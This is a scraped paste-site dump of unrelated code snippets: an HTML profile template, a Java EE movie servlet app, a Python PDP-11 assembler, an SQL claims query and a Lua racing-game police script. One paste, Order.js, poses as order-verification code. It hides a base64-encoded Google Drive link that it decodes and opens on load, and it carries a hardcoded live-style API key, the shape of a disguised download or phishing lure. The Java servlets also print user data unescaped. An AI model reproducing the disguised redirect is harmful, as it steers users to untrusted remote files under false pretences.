              <b>Weaknesses & Flaws</b>
              <p>TEXT HERE</p>
              
              <b>Quirks & Tropes</b>
              <p>TEXT HERE</p>
              
        </div>
    </div>
    
    
    <!-- ------------------------------------
                 RELATIONSHIPS
    ------------------------------------- -->
    <div class=""mb-0"">
        
        <!-- ------ HEADER ------------------------------ -->
 <div class=""p-1 text-uppercase"" style=""font-size:120%; letter-spacing:2px"">
            
            <i class=""far fa-link fa-fw"" style=""color:#ffffff""></i>
            Relationships
            
        </div>
        <hr class=""my-1 mb-2 w-100"">
        
        <!-- ------ CONTENT ------------------------------ -->
        <!--
        optional but feel free to add [†] after [Relation] to show that the character is dead!
        -->
        <div class=""row no-gutters"">
            
            <!-- --- RELATIONSHIP --- -->
            <div class=""col-lg-6 p-3"">
                
                <!-- GENERAL INFO -->  
                <div class=""text-uppercase"">
                    
                    <a href=""https://toyhou.se/4955766.sana"" style=""color:#ffffff"">PERSON RELATED TO</a>
                    
                </div>
                <hr class=""my-1 w-100"">
                <div class=""mb-1 justify-content-between"">
                <!--
                full : <i class=""fas fa-heart""></i>
                empty: <i class=""far fa-heart text-muted""></i>
                -->
                    <span>RELATION</span>
                    <span>
                        <i class=""fas fa-heart""></i>
                        <i class=""fas fa-heart""></i>
                        <i class=""fas fa-heart text-muted""></i>
                        <i class=""fas fa-heart text-muted""></i>
                        <i class=""fas fa-heart text-muted""></i>
                    </span>
                    
                </div>
                
                <!-- IMAGE --> 
                <!--
                → i'd recommand a square image
                → delete [fr-rounded] in the img class if you want a square icon!
                -->
                <div class=""mr-2 float-left justify-content-center"">
                    
                    <img src=""https://upload.wikimedia.org/wikipedia/commons/1/1b/Square_200x200.png""
                    class=""fr-rounded p-1 mr-lg-1"" style=""height:90px; width:90px;"">
                    
                </div>
                
                <!-- CONTENT -->  
                <div class=""pt-2 text-muted"">
                    
                    <p>RELATION QUOTE</p>
                    <p>DESCRIPTION OF RELATIONSHIP</p>

                </div>
            </div>
            
        <!-- add/delete more relationship boxes ABOVE this line! -->
        </div>
    </div>
    
    <!-- don't touch the below thanks! -->
    </div>
 </div>
   
 <!-- ------------------------------
 
 
            CREDITS
            → please keep credits on the profile
            if you decide to move it!
 

 ------------------------------- -->
 <div class=""col-lg-12 p-1"">
    <div class=""bg-faded text-right p-2"" style=""font-size:90%; letter-spacing:0.05em;"">
        
        original code by <a href=""https://toyhou.se/5634482.-f2u-heavy-warrior-cats-"" style=""color:#ffffff; text-decoration: none"">jiko</a>
        
    </div>
 </div> 
</div>"
JZ6euy1q,JAVA INTERNAL,stronk_8s,Java,Thursday 3rd of April 2025 01:07:42 PM CDT,"//Local.java
@Local
public interface MovieBeansLocal {

    void addmovie(String moviename, Collection<Integer> tids);

    Collection<Movie> getallmovies();

    Movie getMovieById(Integer id);

    void deletemoviebyid(Integer id);

    Collection<Theater> getalltheaters();

    Collection<Theater> getalltheatersbymovie(Integer id);

    Collection<Movie> getallmoviesbytheater(Integer id);
}

//Beans.java

@Stateless
public class MovieBeans implements MovieBeansLocal {

    @PersistenceContext(unitName = ""my_persistence_unit"")
    EntityManager em;

    @Override
    public void addmovie(String moviename, Collection<Integer> tids) {
        Movie m = new Movie();
        m.setName(moviename);
        em.persist(m);
        Collection<Theater> t = new ArrayList<>();
        for (Integer q : tids) {
            Theater o = em.find(Theater.class, q);

            if (o != null) {
                Collection<Movie> s = o.getMovieCollection();
                s.add(m);

                t.add(o);
                m.setTheaterCollection(t);
                o.setMovieCollection(s);
                em.merge(o);
            }
        }
    }

    @Override
    public Collection<Movie> getallmovies() {
        return em.createNamedQuery(""Movie.findAll"").getResultList();
    }

    @Override
    public void deletemoviebyid(Integer id) {
        Movie m = em.find(Movie.class, id);
        Collection<Theater> theater = m.getTheaterCollection();
        for (Theater t : theater) {
            if (t != null) {
                Collection<Movie> d = t.getMovieCollection();
                d.remove(m);
                t.setMovieCollection(d);
            }
        }
        em.remove(m);
    }

    @Override
    public Collection<Theater> getalltheaters() {
        return em.createNamedQuery(""Theater.findAll"").getResultList();
    }

    @Override
    public Collection<Theater> getalltheatersbymovie(Integer id) {
        Movie m = em.find(Movie.class, id);
        return m.getTheaterCollection();
    }

    @Override
    public Collection<Movie> getallmoviesbytheater(Integer id) {
        Theater t = em.find(Theater.class, id);
        return t.getMovieCollection();
    }

    @Override
    public Movie getMovieById(Integer id) {
        return em.find(Movie.class, id);
    }
}



//List-Servlet.java

@WebServlet(name = ""MovieServlet"", urlPatterns = {""/MovieServlet""})
public class MovieServlet extends HttpServlet {
    
    @EJB
    MovieBeansLocal mbl;
    
    Collection<Movie> movies = new ArrayList<>();
    Collection<Theater> theaters = new ArrayList<>();

 
    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType(""text/html;charset=UTF-8"");
        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println(""<!DOCTYPE html>"");
            out.println(""<html>"");
            out.println(""<head>"");
            out.println(""<title>Servlet MovieServlet</title>"");
            out.println(""</head>"");
            out.println(""<body>"");
            out.println(""<h1>Servlet MovieServlet at "" + request.getContextPath() + ""</h1>"");
            out.println(""<a href='AddServlet'>Add Servlet</a>"");
            out.println(""<table border='1'><tr><td>Moviename</td><td>Theaters</td><td>City</td><td>State</td><td>location</td><td>TO Delete</td></tr>"");
            movies = mbl.getallmovies();
            for (Movie k : movies) {
                out.println(""<tr>"");
                out.println(""<td>"" + k.getName() + ""</td>"");
                theaters = mbl.getalltheatersbymovie(k.getId());
                Theater temp = new Theater();
                out.println(""<td><ui>"");
                for (Theater t : theaters) {
                    out.println(""<li>"" + t.getName() + ""</li>"");
                    temp = t;
                }
                out.println(""</ui></td>"");
                out.println(""<td>"" + temp.getState() + ""</td>"");
                out.println(""<td>"" + temp.getLocation() + ""</td>"");
                out.println(""<td>"" + temp.getCity() + ""</td>"");
                out.println(""<td><a href='EditMovieServlet?id="" + k.getId() + ""'>Edit Movie</a></td>"");
                out.println(""<td><a href='MovieServlet?delid="" + k.getId() + ""'>Delete Movie</a></td>"");
                out.println(""</tr>"");
            }
            out.println(""</table>"");
            out.println(""</body>"");
            out.println(""</html>"");
        }
    }

 
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String del_id = request.getParameter(""delid"");
        if (del_id != null) {
            mbl.deletemoviebyid(Integer.parseInt(del_id));
            response.sendRedirect(""MovieServlet"");
        } else {
            processRequest(request, response);
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    @Override
    public String getServletInfo() {
        return ""Short description"";
    }

}


//Add-Servlet.java

@WebServlet(name = ""AddServlet"", urlPatterns = {""/AddServlet""})
public class AddServlet extends HttpServlet {

    @EJB
    MovieBeansLocal mbl;

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType(""text/html;charset=UTF-8"");
        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println(""<!DOCTYPE html>"");
            out.println(""<html>"");
            out.println(""<head>"");
            out.println(""<title>Servlet AddServlet</title>"");
            out.println(""</head>"");
            out.println(""<body>"");
            out.println(""<h1>Servlet AddServlet at "" + request.getContextPath() + ""</h1>"");
            out.println(""<form action=\""AddServlet\"" method=\""POST\"">\n""
                    + ""<input type=\""text\"" name=\""name\"" value=\""\"" />\n""
                    + ""<input type=\""checkbox\"" name=\""theater\"" value=\""1\"" checked=\""checked\"" />Rupam\n""
                    + ""<input type=\""checkbox\"" name=\""theater\"" value=\""2\"" />Rajhans\n""
                    + ""<input type=\""checkbox\"" name=\""theater\"" value=\""3\"" />PVR\n""
                    + ""<input type=\""checkbox\"" name=\""theater\"" value=\""4\"" />INOR\n""
                    + ""<input type=\""submit\"" value=\""add\"" />""
                    + ""</form>\n"");
            out.println(""</body>"");
            out.println(""</html>"");
        }
    }
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String moviename = request.getParameter(""name"");
        if (moviename != null) {
            String[] s = request.getParameterValues(""theater"");
            Collection<Integer> c = new ArrayList<>();
            for (String p : s) {
                Integer a = Integer.parseInt(p);
                c.add(a);
            }

            mbl.addmovie(moviename, c);
        }
        response.sendRedirect(""MovieServlet"");
    }
    @Override
    public String getServletInfo() {
        return ""Short description"";
    }
}
"
uPQSXgv1,Order.js,kammex,JavaScript,Thursday 3rd of April 2025 12:56:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/636/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eZipV2dd,my_code_2,Korotkodul,Python,Thursday 3rd of April 2025 12:48:33 PM CDT,"import pyparsing as pp
import re
import struct
from typing import List, Dict, Union


class PDP11Assembler:
    def __init__(self):
        # Инициализация парсера pyparsing (как в вашем коде)
        self.command_name = pp.Word(pp.alphas)
        self.argument_name = pp.Word(pp.printables, exclude_chars=';,')
        self.arguments = pp.Optional(self.argument_name) + pp.ZeroOrMore(pp.Suppress(',') + self.argument_name)
        self.label = pp.Word(pp.alphas) + pp.Optional(pp.Suppress(' ')) + pp.Suppress("":"")
        self.comment = pp.Suppress(';') + pp.Optional(pp.Suppress(' ')) + pp.restOfLine()
        self.rule = pp.Optional(self.label) + pp.Optional(self.command_name) + pp.Optional(
            self.arguments) + pp.Optional(self.comment)

        # Таблица команд (расширенная версия)
        self.command_table = {
            'halt': {'opcode': 0o000000, 'args': [], 'handler': self._handle_no_args},
            'mov': {'opcode': 0o010000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'add': {'opcode': 0o060000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'sub': {'opcode': 0o160000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'cmp': {'opcode': 0o020000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'br': {'opcode': 0o000400, 'args': ['xx'], 'handler': self._handle_branch},
            'bne': {'opcode': 0o001000, 'args': ['xx'], 'handler': self._handle_branch},
        }

        self.labels = {}
        self.current_address = 0o1000
        self.output_blocks = []

    def parse_line(self, line: str) -> List[str]:
        """"""Аналог вашей функции parse с улучшениями""""""
        line = line.strip()
        if not line:
            return []

        if line.startswith('.'):
            if line.startswith('.='):
                return ['origin', line[2:].strip()]
            return []

        try:
            return self.rule.parseString(line).asList()
        except pp.ParseException:
            return []

    def _handle_no_args(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд без аргументов""""""
        words.append(cmd['opcode'])

    def _handle_branch(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд ветвления""""""
        words.append(cmd['opcode'])
        words.append(args[0])  # Сохраняем метку для разрешения позже

    def _handle_ss_dd(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка двухоперандных команд""""""
        src = self._parse_operand(args[0])
        dst = self._parse_operand(args[1])

        instruction = cmd['opcode'] | (src['mode'] << 6) | (src['reg'] << 3) | dst['mode'] | dst['reg']
        words.append(instruction)

        if src['mode'] == 0o27:  # Немедленная адресация
            words.append(src['value'])

    def _parse_operand(self, op: str) -> Dict[str, Union[int, str]]:
        """"""Улучшенный парсер операндов""""""
        if not op:
            return {'mode': 0, 'reg': 0, 'value': 0}

        # Регистровая адресация (R0-R7)
        if re.match(r'^[rR][0-7]$', op):
            return {'mode': 0, 'reg': int(op[1]), 'value': 0}

        # Немедленная адресация (#n)
        if op.startswith('#'):
            return {'mode': 0o27, 'reg': 0, 'value': int(op[1:])}

        return {'mode': 0, 'reg': 0, 'value': 0}

    def cmd_to_raw_machine_code(self, parsed: List[str]) -> List[Union[int, str]]:
        """"""Аналог вашей функции, но с улучшенной структурой""""""
        if not parsed:
            return []

        if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
            # Обработка метки
            label = parsed[0][0]
            self.labels[label] = self.current_address
            parsed = parsed[1:]

        if not parsed:
            return []

        if parsed[0] == 'origin':
            self.current_address = int(parsed[1], 8)
            return []

        cmd_name = parsed[0].lower()
        if cmd_name not in self.command_table:
            return []

        cmd = self.command_table[cmd_name]
        args = parsed[1:]

        if len(args) != len(cmd['args']):
            return []

        words = []
        cmd['handler'](cmd, args, words)
        return words

    def first_pass(self, lines: List[str]):
        """"""Первый проход: сбор меток""""""
        self.current_address = 0o1000

        for line in lines:
            parsed = self.parse_line(line)
            if not parsed:
                continue

            if parsed[0] == 'origin':
                self.current_address = int(parsed[1], 8)
                continue

            if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
                label = parsed[0][0]
                self.labels[label] = self.current_address
                parsed = parsed[1:]

            if not parsed:
                continue

            cmd_name = parsed[0].lower()
            if cmd_name in self.command_table:
                cmd = self.command_table[cmd_name]
                self.current_address += 2  # Основное слово команды

                # Учет дополнительных слов
                for arg in parsed[1:]:
                    if arg.startswith('#'):
                        self.current_address += 2

    def second_pass(self, lines: List[str]):
        """"""Второй проход: генерация машинного кода""""""
        self.current_address = 0o1000
        current_block = {'start': 0o1000, 'data': []}

        for line in lines:
            parsed = self.parse_line(line)
            if not parsed:
                continue

            if parsed[0] == 'origin':
                if current_block['data']:
                    self.output_blocks.append(current_block)
                addr = int(parsed[1], 8)
                current_block = {'start': addr, 'data': []}
                self.current_address = addr
                continue

            if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
                parsed = parsed[1:]
                if not parsed:
                    continue

            words = self.cmd_to_raw_machine_code(parsed)
            for item in words:
                if isinstance(item, str):  # Метка для ветвления
                    offset = (self.labels[item] - self.current_address - 2) // 2
                    current_block['data'][-1] |= (offset & 0o377)
                else:
                    current_block['data'].append(item)
                    self.current_address += 2

        if current_block['data']:
            self.output_blocks.append(current_block)

    def write_s_record_format(self, filename: str):
        """"""Запись результата в требуемом формате""""""
        if not self.output_blocks:
            return

        block = self.output_blocks[0]
        data_bytes = bytearray()

        for word in block['data']:
            # Правильный порядок байтов (как в вашем примере)
            data_bytes.append(word & 0xFF)
            data_bytes.append((word >> 8) & 0xFF)

        with open(filename, 'w') as f:
            # Первая строка: адрес и размер
            f.write(f""0200 {len(data_bytes):04x}\n"")

            # Байты машинного кода
            for byte in data_bytes:
                f.write(f""{byte:02x}\n"")

    def assemble(self, input_filename: str, output_filename: str):
        """"""Основной метод ассемблирования""""""
        with open(input_filename, 'r') as f:
            lines = f.readlines()

        # Два прохода
        self.first_pass(lines)
        self.second_pass(lines)

        # Запись результата
        self.write_s_record_format(output_filename)


# Пример использования
if __name__ == ""__main__"":
    assembler = PDP11Assembler()

    test_code = """"""
        .=1000
        mov #2, r0
        mov #3, r1
        add r0, r1
        halt
    """"""

    with open(""test.asm"", ""w"") as f:
        f.write(test_code)

    assembler.assemble(""test.asm"", ""output.txt"")
    print(""Ассемблирование завершено. Результат в output.txt"")"
mhZHE3xz,Untitled,apoorv_me,MySQL,Thursday 3rd of April 2025 12:39:54 PM CDT,"WITH max_date_cte AS (
    SELECT MAX(year_month) AS max_date_month FROM {val_fact_weekly}
),

val_data_cte AS (
    SELECT 
        claim_id, patient_sk, plan_sk, product_sk, physician_sk, fill_date, 
        mastered_claim_status_code AS claim_status_code, new_to_product_flag AS val_nbrx, 
        YEAR(fill_date) AS mpd_year, pharmacy_distribution_desc AS channel, 
        source_initial_final_flag AS claim_status, source_flag, source_market, market_code
    FROM {val_fact_weekly}
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}'
        AND UPPER(market_code) LIKE ANY ('ACUTE', 'MIGRAINE', 'PREVENTIVE', 'PSYCH')
        AND UPPER(market_code) NOT LIKE '%CON%'
        AND fill_date >= (
            SELECT DISTINCT ADD_MONTHS(TO_DATE(CONCAT(max_date_month,'01'), 'yyyyMMdd'), -16)
            FROM max_date_cte
        )
),

val_product_cte AS (
    SELECT DISTINCT 
        product_sk, source_product_ndc_code AS ndc11, mdm_product_id AS child_product_id, 
        source_product_name AS product_name, abbvie_product_id
    FROM {val_dim_prd_weekly} 
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}' 
        AND source_product_name IN ('VRAYLAR', 'QULIPTA', 'UBRELVY')
),

val_product_data_cte AS (
    SELECT * FROM val_data_cte
    INNER JOIN val_product_cte USING (product_sk)
    WHERE child_product_id IS NOT NULL
),

val_plan_cte AS (
    SELECT DISTINCT 
        plan_sk, source_plan_id AS primary_plan_id, source_payer_name AS primary_payor_name, 
        abbvie_plan_name, abbvie_plan_id, abbvie_plan_channel, pfv_payer_name, 
        pfv_payer_channel, source_plan_channel, source_plan_name, pfv_plan_id
    FROM {val_dim_plan_weekly}
    WHERE source_market IN ('MIGRAINE', 'PSYCH') 
        AND source_flag = '{source_flag}'
),

val_plan_data_cte AS (
    SELECT * FROM val_product_data_cte
    LEFT JOIN val_plan_cte USING (plan_sk)
),

plan_bridge_cte AS (
    SELECT DISTINCT PAYER_PLAN_IDENTIFIER AS payer_plan_id, payer_entity_identifier AS pfv_plan_id 
    FROM pfv_ma360_plan_formulary.pfv_hierarchy_ims_bridge_tbl
),

val_plan_data_final_cte AS (
    SELECT * FROM val_plan_data_cte
    LEFT JOIN plan_bridge_cte USING (pfv_plan_id)
),

acc_map_cte AS (
    SELECT 
        account_id_level1 AS abbvie_plan_id, channel_sk, account_name_level1, 
        account_name_level2, account_name_level3, account_name_level4 
    FROM {acc_map_tbl}
    WHERE account_type_level = 'PLAN'
),

val_acc_map_join_cte AS (
    SELECT * FROM val_plan_data_final_cte
    INNER JOIN acc_map_cte USING (abbvie_plan_id)
),

data_with_mdm_cte AS (
    SELECT DISTINCT child_product_id, product_group_id, market_id, product_group_name 
    FROM {mdm_product_hierarchy_wide_tbl} 
    WHERE market_id IN ('MKT02416165661','MKT33405150037', 'MKT33314581420')
        AND market_name LIKE '%MA_ARC'
        AND product_group_id != market_id
        AND hierarchy_level IN ('PRD', 'PKGSZ')
        AND dds_active_flag = 'Y'
        AND future_current_flag = 'C'
)

SELECT * 
FROM val_acc_map_join_cte
INNER JOIN data_with_mdm_cte USING (child_product_id);
"
c2r3wBcD,dzdzzd,supinus,Lua,Thursday 3rd of April 2025 12:30:05 PM CDT,"ac.log(""Police script"")

local sim = ac.getSim()
local car = ac.getCar(0)
local valideCar = {""audi_rs3_2022_LMC"", ""bmw_m340i_Police_HighSpeed"", ""police_r34_tiresarpi""}
local carID = ac.getCarID(0)

local windowWidth = sim.windowWidth
local windowHeight = sim.windowHeight
local settingsOpen = false
local arrestLogsOpen = false
local camerasOpen = false

local cspVersion = ac.getPatchVersionCode()
local cspMinVersion = 2144
local fontMultiplier = windowHeight/1440

local firstload = true
local cspAboveP218 = cspVersion >= 2363
ac.log(""Police script"")
if not(carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]) or cspVersion < cspMinVersion then return end

local msgArrest = {
    msg = {""`NAME` has been arrested for Speeding. The individual was driving a `CAR`."",
	""We have apprehended `NAME` for Speeding. The suspect was behind the wheel of a `CAR`."",
	""The driver of a `CAR`, identified as `NAME`, has been arrested for Speeding."",
	""`NAME` has been taken into custody for Illegal Racing. The suspect was driving a `CAR`."",
	""We have successfully apprehended `NAME` for Illegal Racing. The individual was operating a `CAR`."",
	""The driver of a `CAR`, identified as `NAME`, has been arrested for Illegal Racing."",
	""`NAME` has been apprehended for Speeding. The suspect was operating a `CAR` at the time of the arrest."",
	""We have successfully detained `NAME` for Illegal Racing. The individual was driving a `CAR`."",
	""`NAME` driving a `CAR` has been arrested for Speeding"",
	""`NAME` driving a `CAR` has been arrested for Illegal Racing.""}
}

local msgLost = {
	msg = {""We've lost sight of the suspect. The vehicle involved is described as a `CAR` driven by `NAME`."",
	""Attention all units, we have lost visual contact with the suspect. The vehicle involved is a `CAR` driven by `NAME`."",
	""We have temporarily lost track of the suspect. The vehicle description is a `CAR` with `NAME` as the driver."",
	""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
	""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",
	""Suspect have been lost, Vehicle Description:`CAR` driven by `NAME`"",
	""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
	""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",}
}

local msgEngage = {
    msg = {""Control! I am engaging on a `CAR` traveling at `SPEED`"",""Pursuit in progress! I am chasing a `CAR` exceeding `SPEED`"",""Control, be advised! Pursuit is active on a `CAR` driving over `SPEED`"",""Attention! Pursuit initiated! Im following a `CAR` going above `SPEED`"",""Pursuit engaged! `CAR` driving at a high rate of speed over `SPEED`"",""Attention all units, we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""Attention units! We have a suspect fleeing in a `CAR` at high speed, pursuing now at `SPEED`"",""Engaging on a high-speed chase! Suspect driving a `CAR` exceeding `SPEED`!"",""Attention all units! we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""High-speed chase underway, suspect driving `CAR` over `SPEED`"",""Control, `CAR` exceeding `SPEED`, pursuit active."",""Engaging on a `CAR` exceeding `SPEED`, pursuit initiated.""}
}

------------------------------------------------------------------------- JSON Utils -------------------------------------------------------------------------

local json = {}

-- Internal functions.

local function kind_of(obj)
  if type(obj) ~= 'table' then return type(obj) end
  local i = 1
  for _ in pairs(obj) do
    if obj[i] ~= nil then i = i + 1 else return 'table' end
  end
  if i == 1 then return 'table' else return 'array' end
end

local function escape_str(s)
  local in_char  = {'\\', '""', '/', '\b', '\f', '\n', '\r', '\t'}
  local out_char = {'\\', '""', '/',  'b',  'f',  'n',  'r',  't'}
  for i, c in ipairs(in_char) do
    s = s:gsub(c, '\\' .. out_char[i])
  end
  return s
end

-- Returns pos, did_find; there are two cases:
-- 1. Delimiter found: pos = pos after leading space + delim; did_find = true.
-- 2. Delimiter not found: pos = pos after leading space;     did_find = false.
-- This throws an error if err_if_missing is true and the delim is not found.
local function skip_delim(str, pos, delim, err_if_missing)
  pos = pos + #str:match('^%s*', pos)
  if str:sub(pos, pos) ~= delim then
    if err_if_missing then
      error('Expected ' .. delim .. ' near position ' .. pos)
    end
    return pos, false
  end
  return pos + 1, true
end

-- Expects the given pos to be the first character after the opening quote.
-- Returns val, pos; the returned pos is after the closing quote character.
local function parse_str_val(str, pos, val)
  val = val or ''
  local early_end_error = 'End of input found while parsing string.'
  if pos > #str then error(early_end_error) end
  local c = str:sub(pos, pos)
  if c == '""'  then return val, pos + 1 end
  if c ~= '\\' then return parse_str_val(str, pos + 1, val .. c) end
  -- We must have a \ character.
  local esc_map = {b = '\b', f = '\f', n = '\n', r = '\r', t = '\t'}
  local nextc = str:sub(pos + 1, pos + 1)
  if not nextc then error(early_end_error) end
  return parse_str_val(str, pos + 2, val .. (esc_map[nextc] or nextc))
end

-- Returns val, pos; the returned pos is after the number's final character.
local function parse_num_val(str, pos)
  local num_str = str:match('^-?%d+%.?%d*[eE]?[+-]?%d*', pos)
  local val = tonumber(num_str)
  if not val then error('Error parsing number at position ' .. pos .. '.') end
  return val, pos + #num_str
end


-- Public values and functions.

function json.stringify(obj, as_key)
  local s = {}  -- We'll build the string as an array of strings to be concatenated.
  local kind = kind_of(obj)  -- This is 'array' if it's an array or type(obj) otherwise.
  if kind == 'array' then
    if as_key then error('Can\'t encode array as key.') end
    s[#s + 1] = '['
    for i, val in ipairs(obj) do
      if i > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(val)
    end
    s[#s + 1] = ']'
  elseif kind == 'table' then
    if as_key then error('Can\'t encode table as key.') end
    s[#s + 1] = '{'
    for k, v in pairs(obj) do
      if #s > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(k, true)
      s[#s + 1] = ':'
      s[#s + 1] = json.stringify(v)
    end
    s[#s + 1] = '}'
  elseif kind == 'string' then
    return '""' .. escape_str(obj) .. '""'
  elseif kind == 'number' then
    if as_key then return '""' .. tostring(obj) .. '""' end
    return tostring(obj)
  elseif kind == 'boolean' then
    return tostring(obj)
  elseif kind == 'nil' then
    return 'null'
  else
    error('Unjsonifiable type: ' .. kind .. '.')
  end
  return table.concat(s)
end

json.null = {}  -- This is a one-off table to represent the null value.

function json.parse(str, pos, end_delim)
  pos = pos or 1
  if pos > #str then error('Reached unexpected end of input.') end
  local pos = pos + #str:match('^%s*', pos)  -- Skip whitespace.
  local first = str:sub(pos, pos)
  if first == '{' then  -- Parse an object.
    local obj, key, delim_found = {}, true, true
    pos = pos + 1
    while true do
      key, pos = json.parse(str, pos, '}')
      if key == nil then return obj, pos end
      if not delim_found then error('Comma missing between object items.') end
      pos = skip_delim(str, pos, ':', true)  -- true -> error if missing.
      obj[key], pos = json.parse(str, pos)
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '[' then  -- Parse an array.
    local arr, val, delim_found = {}, true, true
    pos = pos + 1
    while true do
      val, pos = json.parse(str, pos, ']')
      if val == nil then return arr, pos end
      if not delim_found then error('Comma missing between array items.') end
      arr[#arr + 1] = val
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '""' then  -- Parse a string.
    return parse_str_val(str, pos + 1)
  elseif first == '-' or first:match('%d') then  -- Parse a number.
    return parse_num_val(str, pos)
  elseif first == end_delim then  -- End of an object or array.
    return nil, pos + 1
  else  -- Parse true, false, or null.
    local literals = {['true'] = true, ['false'] = false, ['null'] = json.null}
    for lit_str, lit_val in pairs(literals) do
      local lit_end = pos + #lit_str - 1
      if str:sub(pos, lit_end) == lit_str then return lit_val, lit_end + 1 end
    end
    local pos_info_str = 'position ' .. pos .. ': ' .. str:sub(pos, pos + 10)
    error('Invalid json syntax starting at ' .. pos_info_str)
  end
end

--return json of playerData with only the data needed for the leaderboard
-- data are keys of the playerData table
local function dataStringify(data)
	local str = '{""' .. ac.getUserSteamID() .. '"": '
	local name = ac.getDriverName(0)
	data['Name'] = name
	str = str .. json.stringify(data) .. '}'
	return str
end


------------------------------------------------------------------------- Web Utils -------------------------------------------------------------------------

local settings = {
	essentialSize = 20,
	policeSize = 20,
	hudOffsetX = 0,
	hudOffsetY = 0,
	fontSize = 20,
	current = 1,
	colorHud = rgbm(1,0,0,1),
	timeMsg = 10,
	msgOffsetY = 10,
	msgOffsetX = windowWidth/2,
	fontSizeMSG = 30,
	menuPos = vec2(0, 0),
	unit = ""km/h"",
	unitMult = 1,
	starsSize = 20,
	starsPos = vec2(windowWidth, 0),
}

local settingsJSON = {
	essentialSize = 20,
	policeSize = 20,
	hudOffsetX = 0,
	hudOffsetY = 0,
	fontSize = 20,
	current = 1,
	colorHud = ""1,0,0,1"",
	timeMsg = 10,
	msgOffsetY = 10,
	msgOffsetX = ""1280"",
	fontSizeMSG = 30,
	menuPos = vec2(0, 0),
	unit = ""km/h"",
	unitMult = 1,
	starsSize = 20,
	starsPos = vec2(windowWidth, 0),
}


local function stringToVec2(str)
	if str == nil then return vec2(0, 0) end
	local x = string.match(str, ""([^,]+)"")
	local y = string.match(str, ""[^,]+,(.+)"")
	return vec2(tonumber(x), tonumber(y))
end

local function vec2ToString(vec)
	return tostring(vec.x) .. ',' .. tostring(vec.y)
end

local function stringToRGBM(str)
	local r = string.match(str, ""([^,]+)"")
	local g = string.match(str, ""[^,]+,([^,]+)"")
	local b = string.match(str, ""[^,]+,[^,]+,([^,]+)"")
	local m = string.match(str, ""[^,]+,[^,]+,[^,]+,(.+)"")
	return rgbm(tonumber(r), tonumber(g), tonumber(b), tonumber(m))
end

local function rgbmToString(rgbm)
	return tostring(rgbm.r) .. ',' .. tostring(rgbm.g) .. ',' .. tostring(rgbm.b) .. ',' .. tostring(rgbm.mult)
end

local function parsesettings(table)
	settings.essentialSize = table.essentialSize
	settings.policeSize = table.policeSize
	settings.hudOffsetX = table.hudOffsetX
	settings.hudOffsetY = table.hudOffsetY
	settings.fontSize = table.fontSize
	settings.current = table.current
	settings.colorHud = stringToRGBM(table.colorHud)
	settings.timeMsg = table.timeMsg
	settings.msgOffsetY = table.msgOffsetY
	settings.msgOffsetX = table.msgOffsetX
	settings.fontSizeMSG = table.fontSizeMSG
	settings.menuPos = stringToVec2(table.menuPos)
	settings.unit = table.unit
	settings.unitMult = table.unitMult
	settings.starsSize = table.starsSize or 20
	if table.starsPos == nil then
		settings.starsPos = vec2(windowWidth, 0)
	else
		settings.starsPos = stringToVec2(table.starsPos)
	end
end


ui.setAsynchronousImagesLoading(true)
local imageSize = vec2(0,0)

local hudImg = {
	base = ""https://i.ibb.co/8N4mNj6/zhud.png"",
